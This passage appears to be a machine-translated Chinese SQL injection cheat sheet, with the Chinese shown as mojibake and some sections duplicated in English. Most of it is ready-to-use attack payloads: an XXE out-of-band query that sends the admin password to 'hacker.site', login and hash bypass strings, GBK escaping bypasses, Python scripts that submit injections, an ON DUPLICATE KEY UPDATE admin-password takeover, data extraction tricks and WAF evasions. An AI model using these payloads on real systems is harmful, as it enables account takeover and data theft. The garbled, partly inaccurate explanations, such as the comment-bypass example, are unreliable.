æ€»ç»“ä¸€ä¸‹ï¼Œé€šè¿‡XXEè¿›è¡Œå¸¦å¤–æ•°æ®æ³„éœ²æ˜¯ä¸€ç§åˆ©ç”¨XMLå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´çš„æŠ€æœ¯ï¼Œå¯ä»¥ç»•è¿‡é˜²ç«å¢™æˆ–å…¶ä»–å®‰å…¨æªæ–½ï¼Œå°†æ•æ„Ÿæ•°æ®ä»ç›®æ ‡ç³»ç»Ÿä¸­æ³„éœ²å‡ºæ¥ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨å…¶ä»–åè®®æ¥ä¼ è¾“æ•°æ®ï¼Œå¹¶åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šæ¥æ”¶å’Œæå–è¿™äº›æ•°æ®ã€‚
```sql
a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"> %remote;]>'),'/l') FROM dual-- -
```
## è‡ªåŠ¨åŒ–åˆ©ç”¨

æŸ¥çœ‹[SQLMap Cheetsheat](sqlmap/)ä»¥ä½¿ç”¨[**sqlmap**](https://github.com/sqlmapproject/sqlmap)åˆ©ç”¨SQLiæ¼æ´ã€‚

## æŠ€æœ¯ç‰¹å®šä¿¡æ¯

æˆ‘ä»¬å·²ç»è®¨è®ºäº†åˆ©ç”¨SQLæ³¨å…¥æ¼æ´çš„æ‰€æœ‰æ–¹æ³•ã€‚åœ¨æœ¬ä¹¦ä¸­ï¼Œå¯ä»¥æ‰¾åˆ°ä¸€äº›ä¸æ•°æ®åº“æŠ€æœ¯ç›¸å…³çš„æ›´å¤šæŠ€å·§ï¼š

* [MS Access](ms-access-sql-injection.md)
* [MSSQL](mssql-injection.md)
* [MySQL](mysql-injection/)
* [Oracle](oracle-injection.md)
* [PostgreSQL](postgresql-injection/)

æˆ–è€…æ‚¨å¯ä»¥åœ¨[**https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)ä¸­æ‰¾åˆ°å…³äºMySQLã€PostgreSQLã€Oracleã€MSSQLã€SQLiteå’ŒHQLçš„**è®¸å¤šæŠ€å·§**ã€‚

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/)æ˜¯**è¥¿ç­ç‰™**æœ€é‡è¦çš„ç½‘ç»œå®‰å…¨æ´»åŠ¨ä¹‹ä¸€ï¼Œä¹Ÿæ˜¯**æ¬§æ´²**æœ€é‡è¦çš„æ´»åŠ¨ä¹‹ä¸€ã€‚ä½œä¸ºä¿ƒè¿›æŠ€æœ¯çŸ¥è¯†çš„ä½¿å‘½ï¼Œè¿™ä¸ªå¤§ä¼šæ˜¯æŠ€æœ¯å’Œç½‘ç»œå®‰å…¨ä¸“ä¸šäººå£«åœ¨å„ä¸ªé¢†åŸŸçš„çƒ­ç‚¹äº¤æµã€‚

{% embed url="https://www.rootedcon.com/" %}

## èº«ä»½éªŒè¯ç»•è¿‡

å°è¯•ç»•è¿‡ç™»å½•åŠŸèƒ½çš„åˆ—è¡¨ï¼š

{% content-ref url="../login-bypass/sql-login-bypass.md" %}
[sql-login-bypass.md](../login-bypass/sql-login-bypass.md)
{% endcontent-ref %}

### èº«ä»½éªŒè¯ç»•è¿‡ï¼ˆåŸå§‹MD5ï¼‰

å½“ä½¿ç”¨åŸå§‹MD5æ—¶ï¼Œå¯†ç å°†è¢«æŸ¥è¯¢ä¸ºç®€å•å­—ç¬¦ä¸²ï¼Œè€Œä¸æ˜¯åå…­è¿›åˆ¶å­—ç¬¦ä¸²ã€‚
```sql
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```
å…è®¸æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«`true`è¯­å¥çš„å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚`' or 'SOMETHING`ã€‚
```sql
md5("ffifdyop", true) = 'or'6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½bï¿½
```
### å“ˆå¸Œè®¤è¯ç»•è¿‡

In some cases, web applications use hash-based authentication to verify the user's credentials. This authentication method involves hashing the user's password and comparing it with the stored hash value. However, if the application does not properly validate the user input, it may be vulnerable to hash authentication bypass attacks.

åœ¨æŸäº›æƒ…å†µä¸‹ï¼ŒWebåº”ç”¨ç¨‹åºä½¿ç”¨åŸºäºå“ˆå¸Œçš„è®¤è¯æ¥éªŒè¯ç”¨æˆ·çš„å‡­æ®ã€‚è¿™ç§è®¤è¯æ–¹æ³•æ¶‰åŠå¯¹ç”¨æˆ·çš„å¯†ç è¿›è¡Œå“ˆå¸Œå¤„ç†ï¼Œå¹¶å°†å…¶ä¸å­˜å‚¨çš„å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒã€‚ç„¶è€Œï¼Œå¦‚æœåº”ç”¨ç¨‹åºæ²¡æœ‰æ­£ç¡®éªŒè¯ç”¨æˆ·è¾“å…¥ï¼Œå¯èƒ½ä¼šå­˜åœ¨å“ˆå¸Œè®¤è¯ç»•è¿‡æ”»å‡»çš„æ¼æ´ã€‚

To bypass hash authentication, an attacker can exploit vulnerabilities in the input validation process to inject specially crafted input that will bypass the hash comparison. This can be achieved through various techniques, such as SQL injection or manipulating the input to produce a specific hash collision.

ä¸ºäº†ç»•è¿‡å“ˆå¸Œè®¤è¯ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¾“å…¥éªŒè¯è¿‡ç¨‹ä¸­çš„æ¼æ´ï¼Œæ³¨å…¥ç‰¹åˆ¶çš„è¾“å…¥ï¼Œä»¥ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒã€‚è¿™å¯ä»¥é€šè¿‡å„ç§æŠ€æœ¯å®ç°ï¼Œä¾‹å¦‚SQLæ³¨å…¥æˆ–æ“çºµè¾“å…¥ä»¥äº§ç”Ÿç‰¹å®šçš„å“ˆå¸Œç¢°æ’ã€‚

To identify and exploit hash authentication bypass vulnerabilities, you can follow these steps:

è¦è¯†åˆ«å’Œåˆ©ç”¨å“ˆå¸Œè®¤è¯ç»•è¿‡æ¼æ´ï¼Œå¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤è¿›è¡Œæ“ä½œï¼š

1. **Identify the authentication mechanism**: Determine how the application is performing the hash-based authentication.

   **è¯†åˆ«è®¤è¯æœºåˆ¶**ï¼šç¡®å®šåº”ç”¨ç¨‹åºå¦‚ä½•æ‰§è¡ŒåŸºäºå“ˆå¸Œçš„è®¤è¯ã€‚

2. **Analyze the input validation**: Understand how the application validates user input and look for any potential vulnerabilities.

   **åˆ†æè¾“å…¥éªŒè¯**ï¼šäº†è§£åº”ç”¨ç¨‹åºå¦‚ä½•éªŒè¯ç”¨æˆ·è¾“å…¥ï¼Œå¹¶å¯»æ‰¾ä»»ä½•æ½œåœ¨çš„æ¼æ´ã€‚

3. **Craft malicious input**: Create specially crafted input that can bypass the hash comparison.

   **æ„é€ æ¶æ„è¾“å…¥**ï¼šåˆ›å»ºç‰¹åˆ¶çš„è¾“å…¥ï¼Œä»¥ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒã€‚

4. **Test the input**: Submit the malicious input and observe the application's response. If the authentication is bypassed, the application will grant access without the correct credentials.

   **æµ‹è¯•è¾“å…¥**ï¼šæäº¤æ¶æ„è¾“å…¥å¹¶è§‚å¯Ÿåº”ç”¨ç¨‹åºçš„å“åº”ã€‚å¦‚æœè®¤è¯è¢«ç»•è¿‡ï¼Œåº”ç”¨ç¨‹åºå°†åœ¨æ²¡æœ‰æ­£ç¡®å‡­æ®çš„æƒ…å†µä¸‹æˆäºˆè®¿é—®æƒé™ã€‚

By successfully bypassing hash authentication, an attacker can gain unauthorized access to the application and potentially perform further malicious actions.

é€šè¿‡æˆåŠŸç»•è¿‡å“ˆå¸Œè®¤è¯ï¼Œæ”»å‡»è€…å¯ä»¥æœªç»æˆæƒåœ°è®¿é—®åº”ç”¨ç¨‹åºï¼Œå¹¶æœ‰å¯èƒ½æ‰§è¡Œè¿›ä¸€æ­¥çš„æ¶æ„æ“ä½œã€‚
```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```
**æ¨èåˆ—è¡¨**ï¼š

æ‚¨åº”è¯¥å°†åˆ—è¡¨ä¸­çš„æ¯ä¸€è¡Œä½œä¸ºç”¨æˆ·åï¼Œå¯†ç å§‹ç»ˆä¸ºï¼š_**Pass1234.**_\
ï¼ˆè¿™äº›æœ‰æ•ˆè½½è·ä¹ŸåŒ…å«åœ¨æœ¬èŠ‚å¼€å¤´æåˆ°çš„å¤§åˆ—è¡¨ä¸­ï¼‰

{% file src="../../.gitbook/assets/sqli-hashbypass.txt" %}

### GBKèº«ä»½éªŒè¯ç»•è¿‡

å¦‚æœ'è¢«è½¬ä¹‰ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨%A8%27ï¼Œå½“'è¢«è½¬ä¹‰æ—¶ï¼Œå°†åˆ›å»ºï¼š0xA80x5c0x27ï¼ˆ_â•˜'_ï¼‰
```sql
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
```
```python
import requests

def sql_injection(url, payload):
    # Construct the SQL injection payload
    payload = f"' OR {payload} -- "

    # Send the request with the payload
    response = requests.get(url + payload)

    # Check if the response indicates a successful SQL injection
    if "Error" in response.text:
        print("SQL injection successful!")
    else:
        print("SQL injection failed.")

# Example usage
url = "https://example.com/login"
payload = "1=1"
sql_injection(url, payload)
```
```python
import requests
url = "http://example.com/index.php"
cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3')
datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"}
r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url})
print r.text
```
### å¤šè¯­å¢ƒæ³¨å…¥ï¼ˆå¤šä¸Šä¸‹æ–‡ï¼‰

Polyglot injection refers to a type of SQL injection attack that can work across multiple database management systems (DBMS). It involves crafting a malicious payload that is capable of exploiting vulnerabilities in different DBMS, such as MySQL, Oracle, SQL Server, and PostgreSQL.

å¤šè¯­å¢ƒæ³¨å…¥æ˜¯ä¸€ç§å¯ä»¥åœ¨å¤šä¸ªæ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆDBMSï¼‰ä¸Šè¿è¡Œçš„SQLæ³¨å…¥æ”»å‡»ç±»å‹ã€‚å®ƒæ¶‰åŠæ„é€ æ¶æ„æœ‰æ•ˆè´Ÿè½½ï¼Œèƒ½å¤Ÿåˆ©ç”¨ä¸åŒDBMSï¼ˆå¦‚MySQLã€Oracleã€SQL Serverå’ŒPostgreSQLï¼‰ä¸­çš„æ¼æ´ã€‚

The advantage of using a polyglot injection is that it allows an attacker to target multiple systems with a single payload, increasing the chances of a successful attack. By carefully crafting the payload to be compatible with different DBMS syntax and behavior, the attacker can exploit vulnerabilities across various systems.

ä½¿ç”¨å¤šè¯­å¢ƒæ³¨å…¥çš„ä¼˜åŠ¿åœ¨äºå®ƒå…è®¸æ”»å‡»è€…ä½¿ç”¨å•ä¸ªæœ‰æ•ˆè´Ÿè½½æ¥æ”»å‡»å¤šä¸ªç³»ç»Ÿï¼Œå¢åŠ äº†æˆåŠŸæ”»å‡»çš„æœºä¼šã€‚é€šè¿‡ç²¾å¿ƒæ„é€ ä¸ä¸åŒDBMSè¯­æ³•å’Œè¡Œä¸ºå…¼å®¹çš„æœ‰æ•ˆè´Ÿè½½ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨å„ç§ç³»ç»Ÿä¸­çš„æ¼æ´ã€‚

To create a polyglot injection payload, the attacker needs to have a deep understanding of the syntax and behavior of the target DBMS. By leveraging the similarities and differences between different DBMS, the attacker can create a payload that is interpreted differently by each system, but still achieves the desired malicious outcome.

è¦åˆ›å»ºå¤šè¯­å¢ƒæ³¨å…¥æœ‰æ•ˆè´Ÿè½½ï¼Œæ”»å‡»è€…éœ€è¦å¯¹ç›®æ ‡DBMSçš„è¯­æ³•å’Œè¡Œä¸ºæœ‰æ·±å…¥çš„äº†è§£ã€‚é€šè¿‡åˆ©ç”¨ä¸åŒDBMSä¹‹é—´çš„ç›¸ä¼¼æ€§å’Œå·®å¼‚ï¼Œæ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ªåœ¨æ¯ä¸ªç³»ç»Ÿä¸­ä»¥ä¸åŒæ–¹å¼è§£é‡Šçš„æœ‰æ•ˆè´Ÿè½½ï¼Œä½†ä»ç„¶å®ç°æ‰€éœ€çš„æ¶æ„ç»“æœã€‚

It is important to note that polyglot injection is a complex technique that requires advanced knowledge and expertise in SQL injection attacks. It is typically used by experienced hackers and penetration testers to exploit vulnerabilities in multiple systems simultaneously.

éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¤šè¯­å¢ƒæ³¨å…¥æ˜¯ä¸€ç§å¤æ‚çš„æŠ€æœ¯ï¼Œéœ€è¦å¯¹SQLæ³¨å…¥æ”»å‡»æœ‰é«˜çº§çŸ¥è¯†å’Œä¸“ä¸šæŠ€èƒ½ã€‚é€šå¸¸ç”±ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œæ¸—é€æµ‹è¯•äººå‘˜åŒæ—¶åˆ©ç”¨å¤šä¸ªç³»ç»Ÿä¸­çš„æ¼æ´ã€‚

To protect against polyglot injection attacks, it is crucial to implement proper input validation and sanitization techniques in web applications. This includes using parameterized queries or prepared statements, input validation filters, and strict input length restrictions.

ä¸ºäº†é˜²æ­¢å¤šè¯­å¢ƒæ³¨å…¥æ”»å‡»ï¼Œå…³é”®æ˜¯åœ¨Webåº”ç”¨ç¨‹åºä¸­å®æ–½é€‚å½“çš„è¾“å…¥éªŒè¯å’Œå‡€åŒ–æŠ€æœ¯ã€‚è¿™åŒ…æ‹¬ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢æˆ–é¢„ç¼–è¯‘è¯­å¥ã€è¾“å…¥éªŒè¯è¿‡æ»¤å™¨å’Œä¸¥æ ¼çš„è¾“å…¥é•¿åº¦é™åˆ¶ã€‚

By following secure coding practices and regularly updating and patching the underlying software, organizations can significantly reduce the risk of polyglot injection attacks and other SQL injection vulnerabilities.
```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```
## æ’å…¥è¯­å¥

### ä¿®æ”¹ç°æœ‰å¯¹è±¡/ç”¨æˆ·çš„å¯†ç 

è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œæ‚¨åº”è¯¥å°è¯•**åˆ›å»ºä¸€ä¸ªåä¸ºâ€œä¸»å¯¹è±¡â€çš„æ–°å¯¹è±¡**ï¼ˆåœ¨ç”¨æˆ·çš„æƒ…å†µä¸‹å¯èƒ½æ˜¯**admin**ï¼‰ï¼Œå¹¶è¿›è¡Œä¸€äº›ä¿®æ”¹ï¼š

* åˆ›å»ºåä¸ºï¼š**AdMIn**ï¼ˆå¤§å°å†™å­—æ¯ï¼‰
* åˆ›å»ºåä¸ºï¼š**admin=**çš„ç”¨æˆ·
* **SQLæˆªæ–­æ”»å‡»**ï¼ˆå½“ç”¨æˆ·åæˆ–ç”µå­é‚®ä»¶ä¸­å­˜åœ¨æŸç§**é•¿åº¦é™åˆ¶**æ—¶ï¼‰--> åˆ›å»ºåä¸ºï¼š**admin \[å¾ˆå¤šç©ºæ ¼] a**çš„ç”¨æˆ·

#### SQLæˆªæ–­æ”»å‡»

å¦‚æœæ•°æ®åº“å­˜åœ¨æ¼æ´ï¼Œå¹¶ä¸”ç”¨æˆ·åçš„æœ€å¤§å­—ç¬¦æ•°ä¸º30ï¼Œå¹¶ä¸”æ‚¨æƒ³å†’å……ç”¨æˆ·**admin**ï¼Œè¯·å°è¯•åˆ›å»ºä¸€ä¸ªåä¸ºï¼š"_admin \[30ä¸ªç©ºæ ¼] a_"çš„ç”¨æˆ·åå’Œä»»æ„å¯†ç ã€‚

æ•°æ®åº“å°†**æ£€æŸ¥**æ˜¯å¦åœ¨æ•°æ®åº“ä¸­å­˜åœ¨**è¾“å…¥çš„ç”¨æˆ·å**ã€‚å¦‚æœ**ä¸å­˜åœ¨**ï¼Œå®ƒå°†**æˆªæ–­ç”¨æˆ·å**åˆ°**å…è®¸çš„æœ€å¤§å­—ç¬¦æ•°**ï¼ˆåœ¨æœ¬ä¾‹ä¸­ä¸ºï¼š"_admin \[25ä¸ªç©ºæ ¼]_"ï¼‰ï¼Œç„¶å**è‡ªåŠ¨åˆ é™¤æœ«å°¾çš„æ‰€æœ‰ç©ºæ ¼**ï¼Œå¹¶åœ¨æ•°æ®åº“ä¸­æ›´æ–°ç”¨æˆ·â€œ**admin**â€çš„**æ–°å¯†ç **ï¼ˆå¯èƒ½ä¼šå‡ºç°ä¸€äº›é”™è¯¯ï¼Œä½†è¿™å¹¶ä¸æ„å‘³ç€å®ƒæ²¡æœ‰èµ·ä½œç”¨ï¼‰ã€‚

æ›´å¤šä¿¡æ¯ï¼š[https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html](https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html) & [https://resources.infosecinstitute.com/sql-truncation-attack/#gref](https://resources.infosecinstitute.com/sql-truncation-attack/#gref)

_æ³¨æ„ï¼šåœ¨æœ€æ–°çš„MySQLå®‰è£…ä¸­ï¼Œæ­¤æ”»å‡»å°†ä¸å†æŒ‰ç…§ä¸Šè¿°æè¿°èµ·ä½œç”¨ã€‚è™½ç„¶æ¯”è¾ƒä»ç„¶é»˜è®¤å¿½ç•¥å°¾éšç©ºæ ¼ï¼Œä½†å°è¯•æ’å…¥é•¿åº¦è¶…è¿‡å­—æ®µé•¿åº¦çš„å­—ç¬¦ä¸²å°†å¯¼è‡´é”™è¯¯ï¼Œå¹¶ä¸”æ’å…¥å°†å¤±è´¥ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…_ [_https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation_](https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation)\_\_

### MySQLåŸºäºæ—¶é—´çš„æ’å…¥æ£€æŸ¥

æ ¹æ®éœ€è¦æ·»åŠ å°½å¯èƒ½å¤šçš„`','',''`ä»¥é€€å‡ºVALUESè¯­å¥ã€‚å¦‚æœå»¶è¿Ÿæ‰§è¡Œï¼Œåˆ™å­˜åœ¨SQLæ³¨å…¥ã€‚
```sql
name=','');WAITFOR%20DELAY%20'0:0:5'--%20-
```
### ON DUPLICATE KEY UPDATE

ON DUPLICATE KEY UPDATE å…³é”®å­—ç”¨äºå‘Šè¯‰MySQLåœ¨åº”ç”¨ç¨‹åºå°è¯•æ’å…¥å·²ç»å­˜åœ¨äºè¡¨ä¸­çš„è¡Œæ—¶åº”è¯¥åšä»€ä¹ˆã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªå…³é”®å­—æ¥æ›´æ”¹ç®¡ç†å‘˜å¯†ç ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š
```
Inject using payload:
attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" --

The query would look like this:
INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" -- ", "bcrypt_hash_of_your_password_input");

This query will insert a row for the user â€œattacker_dummy@example.comâ€. It will also insert a row for the user â€œadmin@example.comâ€.
Because this row already exists, the ON DUPLICATE KEY UPDATE keyword tells MySQL to update the `password` column of the already existing row to "bcrypt_hash_of_qwerty".

After this, we can simply authenticate with â€œadmin@example.comâ€ and the password â€œqwertyâ€!
```
### æå–ä¿¡æ¯

#### åŒæ—¶åˆ›å»ºä¸¤ä¸ªè´¦æˆ·

åœ¨å°è¯•åˆ›å»ºæ–°ç”¨æˆ·æ—¶ï¼Œéœ€è¦æä¾›ç”¨æˆ·åã€å¯†ç å’Œç”µå­é‚®ä»¶ï¼š
```
SQLi payload:
username=TEST&password=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -

A new user with username=otherUsername, password=otherPassword, email:FLAG will be created
```
#### ä½¿ç”¨åè¿›åˆ¶æˆ–åå…­è¿›åˆ¶

ä½¿ç”¨è¿™ç§æŠ€æœ¯ï¼Œæ‚¨å¯ä»¥ä»…åˆ›å»ºä¸€ä¸ªå¸æˆ·æ¥æå–ä¿¡æ¯ã€‚é‡è¦çš„æ˜¯è¦æ³¨æ„ï¼Œæ‚¨ä¸éœ€è¦æ·»åŠ ä»»ä½•æ³¨é‡Šã€‚

ä½¿ç”¨**hex2dec**å’Œ**substr**ï¼š
```sql
'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
è¦è·å–æ–‡æœ¬ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•ï¼š
```python
__import__('binascii').unhexlify(hex(215573607263)[2:])
```
ä½¿ç”¨**hex**å’Œ**replace**ï¼ˆä»¥åŠ**substr**ï¼‰ï¼š
```sql
'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

#Full ascii uppercase and lowercase replace:
'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%"),"z","&"),"J","'"),"K","`"),"L","("),"M",")"),"N","@"),"O","$$"),"Z","&&")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) æ˜¯è¥¿ç­ç‰™æœ€é‡è¦çš„ç½‘ç»œå®‰å…¨æ´»åŠ¨ä¹‹ä¸€ï¼Œä¹Ÿæ˜¯æ¬§æ´²æœ€é‡è¦çš„ç½‘ç»œå®‰å…¨æ´»åŠ¨ä¹‹ä¸€ã€‚ä½œä¸ºä¿ƒè¿›æŠ€æœ¯çŸ¥è¯†çš„ä½¿å‘½ï¼Œè¿™ä¸ªå¤§ä¼šæ˜¯æŠ€æœ¯å’Œç½‘ç»œå®‰å…¨ä¸“ä¸šäººå£«çš„çƒ­ç‚¹èšä¼šã€‚

{% embed url="https://www.rootedcon.com/" %}

## è·¯ç”±SQLæ³¨å…¥

è·¯ç”±SQLæ³¨å…¥æ˜¯ä¸€ç§æƒ…å†µï¼Œå…¶ä¸­å¯æ³¨å…¥çš„æŸ¥è¯¢ä¸æ˜¯äº§ç”Ÿè¾“å‡ºçš„æŸ¥è¯¢ï¼Œè€Œæ˜¯å¯æ³¨å…¥çš„æŸ¥è¯¢çš„è¾“å‡ºè¿›å…¥äº§ç”Ÿè¾“å‡ºçš„æŸ¥è¯¢ã€‚([è®ºæ–‡](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt))

ç¤ºä¾‹ï¼š
```sql
#Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```
## WAFç»•è¿‡

### æ— ç©ºæ ¼ç»•è¿‡

æ— ç©ºæ ¼ï¼ˆ%20ï¼‰- ä½¿ç”¨ç©ºæ ¼çš„æ›¿ä»£æ–¹å¼è¿›è¡Œç»•è¿‡
```sql
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```
## No Whitespace - é€šè¿‡ä½¿ç”¨æ³¨é‡Šç»•è¿‡

In some cases, web applications may have filters in place that block certain characters or patterns, such as whitespace. These filters are designed to prevent SQL injection attacks by blocking common attack vectors.

ç„¶è€Œï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼ŒWebåº”ç”¨ç¨‹åºå¯èƒ½ä¼šè®¾ç½®è¿‡æ»¤å™¨æ¥é˜»æ­¢ç‰¹å®šå­—ç¬¦æˆ–æ¨¡å¼ï¼Œä¾‹å¦‚ç©ºæ ¼ã€‚è¿™äº›è¿‡æ»¤å™¨æ—¨åœ¨é€šè¿‡é˜»æ­¢å¸¸è§çš„æ”»å‡»å‘é‡æ¥é˜²æ­¢SQLæ³¨å…¥æ”»å‡»ã€‚

One technique to bypass these filters is to use comments in the SQL injection payload. Comments in SQL are used to add notes or explanations and are ignored by the database engine. By leveraging comments, we can inject malicious SQL code without triggering the filters.

ç»•è¿‡è¿™äº›è¿‡æ»¤å™¨çš„ä¸€ç§æŠ€æœ¯æ˜¯åœ¨SQLæ³¨å…¥è´Ÿè½½ä¸­ä½¿ç”¨æ³¨é‡Šã€‚SQLä¸­çš„æ³¨é‡Šç”¨äºæ·»åŠ æ³¨é‡Šæˆ–è§£é‡Šï¼Œå¹¶ä¸”æ•°æ®åº“å¼•æ“ä¼šå¿½ç•¥å®ƒä»¬ã€‚é€šè¿‡åˆ©ç”¨æ³¨é‡Šï¼Œæˆ‘ä»¬å¯ä»¥æ³¨å…¥æ¶æ„çš„SQLä»£ç è€Œä¸è§¦å‘è¿‡æ»¤å™¨ã€‚

The basic idea is to enclose the injected SQL code within comment tags, such as `/* */` or `--`. This effectively hides the injected code from the filters.

åŸºæœ¬æ€æƒ³æ˜¯å°†æ³¨å…¥çš„SQLä»£ç åŒ…å«åœ¨æ³¨é‡Šæ ‡ç­¾ä¸­ï¼Œä¾‹å¦‚`/* */`æˆ–`--`ã€‚è¿™æœ‰æ•ˆåœ°å°†æ³¨å…¥çš„ä»£ç éšè—åœ¨è¿‡æ»¤å™¨ä¹‹å¤–ã€‚

Here's an example of how to bypass a whitespace filter using comments:

ä»¥ä¸‹æ˜¯ä½¿ç”¨æ³¨é‡Šç»•è¿‡ç©ºæ ¼è¿‡æ»¤å™¨çš„ç¤ºä¾‹ï¼š

Original SQL query:
```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'password'
```

Injected SQL query with comments:
```sql
SELECT * FROM users WHERE username = 'admin'/*' AND password = 'password'
```

In this example, we have commented out the remaining part of the original query by enclosing it within `/*` and `*/`. The database engine will only execute the part of the query before the comment, effectively bypassing the whitespace filter.

åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡å°†å‰©ä½™éƒ¨åˆ†çš„åŸå§‹æŸ¥è¯¢åŒ…å«åœ¨`/*`å’Œ`*/`ä¹‹é—´æ¥æ³¨é‡Šæ‰å®ƒã€‚æ•°æ®åº“å¼•æ“åªä¼šæ‰§è¡Œæ³¨é‡Šä¹‹å‰çš„æŸ¥è¯¢éƒ¨åˆ†ï¼Œæœ‰æ•ˆåœ°ç»•è¿‡äº†ç©ºæ ¼è¿‡æ»¤å™¨ã€‚

It's important to note that this technique may not work in all cases, as the effectiveness of filters can vary depending on the specific implementation. Additionally, it's crucial to thoroughly test and validate the injected SQL code to ensure it achieves the desired outcome without causing unintended consequences.

éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ç§æŠ€æœ¯å¯èƒ½åœ¨æ‰€æœ‰æƒ…å†µä¸‹éƒ½ä¸èµ·ä½œç”¨ï¼Œå› ä¸ºè¿‡æ»¤å™¨çš„æœ‰æ•ˆæ€§å¯èƒ½å› å…·ä½“å®ç°è€Œå¼‚ã€‚æ­¤å¤–ï¼Œå¿…é¡»å½»åº•æµ‹è¯•å’ŒéªŒè¯æ³¨å…¥çš„SQLä»£ç ï¼Œä»¥ç¡®ä¿å®ƒèƒ½å¤Ÿå®ç°é¢„æœŸçš„ç»“æœï¼Œè€Œä¸ä¼šé€ æˆæ„å¤–åæœã€‚
```sql
?id=1/*comment*/and/**/1=1/**/--
```
# No Whitespace - ä½¿ç”¨æ‹¬å·ç»•è¿‡

## Description

In some cases, web application firewalls (WAFs) or input validation filters may be configured to block certain keywords or patterns commonly associated with SQL injection attacks. One common technique used to bypass these filters is to manipulate the SQL query by removing whitespace characters.

However, in some scenarios, removing whitespace characters may not be possible due to strict input validation or other restrictions. In such cases, an alternative approach is to use parentheses to bypass the filters.

## Technique

